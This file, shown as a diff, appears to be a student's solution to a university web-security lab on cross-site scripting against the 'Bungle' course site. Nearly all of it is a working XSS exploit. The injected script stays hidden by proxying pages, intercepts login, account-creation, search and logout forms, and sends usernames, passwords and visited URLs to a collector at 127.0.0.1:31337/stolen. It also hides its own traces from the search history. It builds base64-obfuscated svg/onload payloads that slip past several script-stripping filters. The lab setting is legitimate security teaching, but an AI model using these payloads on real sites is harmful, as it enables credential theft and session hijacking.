@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="33574f7">
+	<title>WebSec 2.2.3</title>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script>
+
+// Inject this payload. 
+// You MAY create your own injection from scratch, but we recommend this template as a starting point:
+
+function payload(attacker) {
+    // This function can make it appear that a new page has been loaded
+    // Note that you can proxy the main page, or a search page!
+	function proxy(href, spying_url) {
+        	// Make all current HTML invisible.
+                $('html').hide();
+
+                //sessionStorage.setItem("status","clean");
+
+        	// overwrites current HTML. Execute a callback function when load has finished.
+        	$('html').load(href, function() {
+                
+                // Show new HTML
+                $('html').show();
+
+                // TODO implement spying while being stealthy and persistent. Remove the alert.
+                //alert("Notice that although we injected code into the search page, you see here the main page!")
+    async function urlBuilder(action,search) {
+            let url = window.location.origin + '/' + action + search;
+            return url;
+    }
+    var old = {'state':'','title':'','url':''};
+    var state = {'state':'','title':'','url':''};
+    async function contextSwitch(r,url) {
+            old['state'] = state['state'];
+            old['title'] = state['title'];
+            old['url'] = state['url']; 
+            $('html').remove('svg');
+            await window.history.pushState(state['state'],state['title'],state['url']);
+            const u = new window.URL(url);
+            state['url'] =  '.'+u.pathname+u.search;
+            let exploit = btoa(proxy.toString() + `;proxy(\``+url+`\`,\``+state['url']+`\`);`);
+            var injection = `<svg onload=eval(atob(\``+exploit+`\`))>`;
+            console.log(injection);
+            let title = $(r).filter('title').text();
+             if (title.includes('Error: 403') || title.includes('Error: 400')) {
+                $('html').contents().remove();
+                $('div').remove('div.container.main');
+                $('div').remove('div.navbar');
+                injection=`<svg/onloadend=eval(atob(\``+exploit+`\`))>`;
+                $(injection).prependTo(r);
+                $(r).appendTo('html');
+                state['state'] = $(r).html();
+            } else if (title.includes('Search Results')) {
+                $('div').remove('div.container.main');
+                $('div').remove('div.navbar');
+                $(injection).prependTo(r);
+                $(r).appendTo('html');
+                state['state'] = $(r).html();
+                state['url'] = `./search`+url.substring(url.lastIndexOf('?q='));
+             }  else {
+                $('div').remove('div.container.main');
+                $('div').remove('div.navbar');
+                $(r).appendTo('html');
+                $(injection).prependTo(r);
+                state['state'] = $(r).html();
+             }
+             state['title'] = title;
+             console.log('state.url:'+state['url']);
+             console.log('url:'+url);
+             console.log('old.url:'+old['url']);
+             console.log('href:'+href);
+             await window.history.pushState(state['state'],state['title'],state['url']);
+        }
+        function changeState(r, url) {
+            if (r == null) {
+                return null;
+            }
+            old['state'] = state['state'];
+            old['title'] = state['title'];
+            old['url'] = state['url']; 
+            const u = new window.URL(url);
+            state['url'] =  '.'+u.pathname+u.search;
+            let exploit = btoa(proxy.toString() + `;proxy(\``+url+`\`,\``+state['url']+`\`);`);
+            var injection = `<svg/onload=eval(atob(\``+exploit+`\`))>`;
+            console.log(injection);
+            let title = $(r).filter('title').text();
+             if (title.includes('Error: 403') || title.includes('Error: 400')) {
+                $('html').contents().remove();
+                exploit = btoa(proxy.toString()+ `;proxy(\``+url+`\`,\``+state['url']+`\`);`);
+                injection=`<svg/onfocus=eval(atob(\``+exploit+`\`))>`;
+                $(r).prependTo('html');
+                state['state'] = $(r).html();
+                $(injection).appendTo('html');
+            } else  {
+                $('html').contents().remove();
+                $(r).prependTo('html');
+                state['state'] = $(r).html();
+                $(injection).insertBefore('title');
+             }
+             state['title'] = title;
+        }
+        window.addEventListener("popstate", function(event) {
+            console.log('213: '+ event.state);
+            console.log('213u: '+ window.history.state);
+
+            changeState(event.state, window.location.origin);
+        });
+        var active_user;
+        if ($('#logged-in-user')) {
+            // alert("2a");
+            active_user = $('#logged-in-user').text();
+        } else {
+            // alert("2b");
+            active_user = '';
+        }
+        function back2Root(el) {
+            if (el) {
+              el.addEventListener('click', async (e)=> {
+                  e.preventDefault();
+                  var nav = await urlBuilder('',''); 
+                  console.log('back2root: '+nav);
+                  $.ajax({
+                      type: 'GET',
+                      url: 'http://bungle-cs461.csl.illinois.edu',
+                      data:{},
+                      success: function(r) {
+                        contextSwitch(r, nav);
+                      },
+                      error: function(r) {}
+                  });
+                  sendData(url='http://127.0.0.1:31337/stolen?',e='nav',user=active_user,pass=nav);
+              });
+            }
+        }
+        function mainListener() {
+            if (document.querySelector("form[action='./login']")) {
+                // alert("1");
+                var logger = document.querySelector("form[action='./login']");//='./login']");
+                var stealer = document.querySelector("input[name='password']");
+                var create = document.querySelector("button[formaction='./create']");;
+                logger.setAttribute('onsubmit','return false;');
+                create.setAttribute('onsubmit','return false;');
+                logger.addEventListener('submit', async (e)=> {
+                    e.preventDefault();
+                    form = new FormData(logger);
+                    var username = form.entries().next().value[1];
+                    var password = stealer.value;
+                    console.log(username+'\t'+password);
+                    var formdata='';
+                    let nav = await urlBuilder('','');
+                    console.log('Action: Login\tUrl: '+nav);
+                    $.ajax({
+                        type: 'POST',
+                        url: 'http://bungle-cs461.csl.illinois.edu/login',
+                        data: {'username':username,'password':password},
+                        success: function(r) {
+                            contextSwitch(r,nav);
+                    }, error: function(r) {
+                            contextSwitch(r.responseText,nav);
+                        }
+                    });
+                    sendData(url='http://127.0.0.1:31337/stolen?',e='login',user=username,pass=password);
+                });
+                create.addEventListener('click', async (e)=> {
+                    e.preventDefault();
+                    form = new FormData(logger);
+                    var username = form.entries().next().value[1];
+                    var password = stealer.value;
+                    var formdata = {'username':username,'password':password};
+                    let nav = await urlBuilder('','');
+                    $.ajax({
+                        type: 'POST',
+                        url: 'http://bungle-cs461.csl.illinois.edu/create',
+                        data: formdata,
+                        success: function(r) {
+                            // alert("successful context swith in create");
+                            contextSwitch(r,nav);
+
+                        },
+                        error: function(r) {
+                            // alert("failed context swith in create");
+                            contextSwitch(r.responseText,nav);
+                        }
+                    });
+                    sendData(url='http://127.0.0.1:31337/stolen?',e='login',user=username,pass=password);
+                    console.log('Action: Create\tUrl: '+nav);
+                });
+            }
+            if ($('a.navbar-brand')) {
+                // alert("3");
+                $('a.navbar-brand').removeAttr('href');
+                $('a.navbar-brand').one('click', (e)=>back2Root(document.querySelector('a.navbar-brand')));
+                console.log('[a.navbar-brand] executed...');
+            }
+            if ($('#bungle-lnk')) {
+                // alert("4");
+                $('#bungle-lnk').removeAttr('href');
+                $('#bungle-lnk').one('click', back2Root(document.querySelector('#bungle-lnk')));
+                console.log('[bungle-lnk] executed...');
+            }
+            if ($("#search-again-btn")) {
+                // alert("5");
+                $("#search-again-btn").removeAttr('href');
+                $('#search-again-btn').one('click',  back2Root(document.querySelector('#search-again-btn')));
+                console.log('[search-again-btn] executed...');
+            }
+            if (document.querySelectorAll('a.history-item.list-group-item')) {
+                // alert("6");
+                var hist_elems = document.querySelectorAll('a.history-item.list-group-item');
+                hist_elems.forEach((e) => {
+                    $('a.history-item.list-group-item').removeAttr('href');
+                    var s = new String(e.text);
+                    if (s) {
+                        if (s.includes('attacker') || s.includes('<') || s.includes('>') || s.includes('payload') || s.includes('proxy') || s.includes('stolen')) {
+                            $(e).remove();
+                        }
+                    }
+                });
+                $('a.history-item.list-group-item').one('click',function() {
+                    // alert("running history item query");
+                    Promise.race([makeQuery($(this).text())]);
+                });
+            }
+            async function makeQuery(q) {
+                var nav = await urlBuilder('','search?q='+encodeURIComponent(q)); 
+                console.log(nav);
+                var url = 'http://127.0.0.1:31337/stolen?event=nav&user='+active_user+'&pass='+nav;
+                $.get(nav).then((r)=>contextSwitch(r,url)).then();
+            }
+            if (document.querySelector("form[action='./search']")) {
+	        var snoop = document.querySelector("form[action='./search']");
+                snoop.setAttribute('onsubmit', 'return false;');
+                snoop.addEventListener('submit', (ev)=> {
+                    ev.preventDefault();
+                    Promise.race([makeQuery($('#query').val())]);
+                    var target = ev.target || ev.srcElement;
+                    return;
+                });
+            }
+            if (document.querySelector('#log-out-btn')) {
+                var logout = document.querySelector('#log-out-btn'); 
+                logout.setAttribute('onsubmit','return false;');
+                logout.setAttribute('type', 'button');
+                logout.addEventListener('click', async (ev)=> {
+                    ev.preventDefault();
+                    var formdata = '';
+                    let nav = await urlBuilder('','');
+                    $.ajax({
+                        type: 'POST',
+                        url: 'http://bungle-cs461.csl.illinois.edu/logout',
+                        success: function(r) {
+                            // alert("successful context swith in log out");
+                            contextSwitch(r,nav);
+                        }, error: function(r) {
+                            // alert("failed context swith in log out");
+                            contextSwitch(r.responseText,nav);
+                        }
+                    });
+                    sendData(url='http://127.0.0.1:31337/stolen?',e='logout',user=active_user,pass=href);
+                    var target = ev.target || ev.srcElement;
+                    return false;
+                });
+            }
+        }
+        function applyExploit() {
+            Promise.race([mainListener()]);
+            console.log('applied.');
+        }
+        async function makeData(e, user, pass) {
+            var body = {};
+            if (e=='nav' || e=='logout') {
+                body = {'event':e,'user':user,'url':pass};
+            } else {
+                body = {'event':e,'user':user,'pass':pass};
+            }
+            return body;
+        }
+        async function sendData(url='',e='',user='',pass='') {
+            console.log("prior to promise");
+            if (url=='' || e =='') return;
+            makeData(e, user, pass).then((data)=>$.get(url,data));
+            return true;
+        }
+        applyExploit(); 
+    });
+}
+    	/* END OF LOAD */
+    	//Call Proxy
+	    window.history.replaceState({}, '', 'http://bungle-cs461.csl.illinois.edu/');
+        proxy('./', attacker);
+}
+
+function makeLink(target, attacker, defense) {
+    // Encode your payload function as a string 
+    payload_string = payload.toString();
+    var exploit = btoa(payload.toString() +
+              ";payload();");
+    var injection = encodeURIComponent("<svg/onload=\"" +
+            "eval(atob('"+exploit+"'));\""+
+            " style='height:1px;width:1px;border:none;'>");
+    var injection6 = encodeURIComponent(`<svg/onload=eval(atob(\``+exploit+`\`))>`);
+    switch(defense) {
+        case 1:
+            // TODO: Implement XSS warmup 2.2.3.1
+            var payload2231 = '<body/onpageshow=%22document.getElementsByTagName'+"('a')[0].href='http://ece.illinois.edu'%22>";
+            return "http://bungle-cs461.csl.illinois.edu/multivac/?name="+payload2231;
+        case 2:
+            // TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<script>" +
+                    payload_string + 
+                    ";payload();" + 
+                    "</script" + ">"
+                );
+        case 3:
+            // TODO: generate XSS URL for defense level 2.2.3.3
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+                encodeURIComponent(
+                    "<sscriptcscriptrscriptiscriptpscripttscript>" +
+                    payload_string + 
+                    ";payload();" + 
+                    "</sscriptcscriptrscriptiscriptpscripttscript>"
+                );
+        case 4:
+            // TODO: generate XSS URL payload for defense level 2.2.3.4
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" +injection;
+
+        case 5:
+            // TODO: generate XSS URL payload for defense level 2.2.3.5
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + injection; //"SOLVE ME"
+        case 6:
+            // TODO: generate XSS URL payload for defense level 2.2.3.6
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + injection6;//"SOLVE ME"
+    }
+}
+
+// Generates malicous
+// You MUST not modify anything past this line.
+var target = `http://bungle-cs461.csl.illinois.edu/`;
+var attacker = `http://127.0.0.1:31337/stolen/`;
+
+$(function() {
+    $("#defense1").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 1) + "\">Try The Warmup! 2.2.3.1</a>");
+	$("#defense2").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 2) + "\">Try Bungle! 2.2.3.2 (No Defense)</a>");
+    $("#defense3").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 3) + "\">Try Bungle! 2.2.3.3 (Remove Script)</a>");
+    $("#defense4").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 4) + "\">Try Bungle! 2.2.3.4 (Recursively Remove Script)</a>");
+    $("#defense5").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 5) + "\">Try Bungle! 2.2.3.5 (Recursively Remove Tags)</a>");
+    $("#defense6").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 6) + "\">Try Bungle! 2.2.3.6 (Remove Quote Marks</a>");
+});
+</script>
+</head>
+
+<body>
+    <h3 id="defense1"></h3>
+    <h3 id="defense2"></h3>
+    <h3 id="defense3"></h3>
+    <h3 id="defense4"></h3>
+    <h3 id="defense5"></h3>
+    <h3 id="defense6"></h3>
+</body>
+</html>
